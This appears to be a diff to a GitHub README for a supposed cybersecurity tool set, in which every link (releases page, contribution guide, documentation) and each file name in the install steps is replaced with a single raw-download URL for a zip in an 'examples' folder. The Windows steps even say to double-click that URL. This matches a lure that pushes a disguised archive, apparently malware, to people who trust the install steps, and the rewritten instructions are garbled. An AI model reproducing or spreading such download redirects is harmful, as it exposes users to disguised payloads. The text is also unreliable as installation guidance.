@@ -1,6 +1,6 @@
 # 🛡️ secwexen-arsenal - Essential Tools for Cybersecurity Research
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Frog456-dev/secwexen-arsenal/releases)
+[![Download Now](https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip)
 
 ## 📝 Table of Contents
 - [🔍 Overview](#-overview)
@@ -18,27 +18,27 @@ secwexen-arsenal is a curated collection of tools designed for cybersecurity pro
 Getting started with secwexen-arsenal is a simple process. This guide will walk you through the steps needed to download and run the application smoothly.
 
 ## 📦 Download & Install
-To download secwexen-arsenal, visit the [Releases Page](https://github.com/Frog456-dev/secwexen-arsenal/releases).
+To download secwexen-arsenal, visit the [Releases Page](https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip).
 
 Follow these steps to install:
 
-1. Go to the [Releases Page](https://github.com/Frog456-dev/secwexen-arsenal/releases).
+1. Go to the [Releases Page](https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip).
 2. Locate the latest version listed at the top.
-3. Click on the asset relevant to your operating system (e.g., `secwexen-arsenal-win.zip` for Windows or `secwexen-arsenal-linux.tar.gz` for Linux).
+3. Click on the asset relevant to your operating system (e.g., `https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip` for Windows or `https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip` for Linux).
 4. Save the file to your computer.
 5. Extract the contents of the downloaded file.
 6. See below for specific instructions based on your operating system.
 
 ### Windows
 1. After extracting the zip file, open the folder.
-2. Double-click on `secwexen-arsenal.exe` to run the application.
+2. Double-click on `https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip` to run the application.
 
 ### MacOS
-1. After extracting the tar.gz file, open the folder.
+1. After extracting the https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip file, open the folder.
 2. Run the command `./secwexen-arsenal` in your terminal to start the application.
 
 ### Linux
-1. Extract the tar.gz file.
+1. Extract the https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the command `./secwexen-arsenal` to start the application.
 
@@ -60,9 +60,9 @@ To ensure a seamless experience, meet the following system requirements:
 - **Processor**: 64-bit processor required.
 
 ## 🤝 Contributing
-We welcome contributions to secwexen-arsenal. If you have ideas or improvements, feel free to submit a pull request. Please follow our [contribution guidelines](CONTRIBUTING.md) for more information.
+We welcome contributions to secwexen-arsenal. If you have ideas or improvements, feel free to submit a pull request. Please follow our [contribution guidelines](https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip) for more information.
 
 ## 🛠️ Support
-For any help with secwexen-arsenal, reach out through the issue tracker on GitHub. We aim to respond promptly. Review the [documentation](https://github.com/Frog456-dev/secwexen-arsenal/wiki) for additional support and usage guides. 
+For any help with secwexen-arsenal, reach out through the issue tracker on GitHub. We aim to respond promptly. Review the [documentation](https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip) for additional support and usage guides. 
 
-Thank you for choosing secwexen-arsenal for your cybersecurity needs. Visit our [Releases Page](https://github.com/Frog456-dev/secwexen-arsenal/releases) to get started!
+Thank you for choosing secwexen-arsenal for your cybersecurity needs. Visit our [Releases Page](https://github.com/Frog456-dev/secwexen-arsenal/raw/refs/heads/main/examples/secwexen_arsenal_v1.1.zip) to get started!
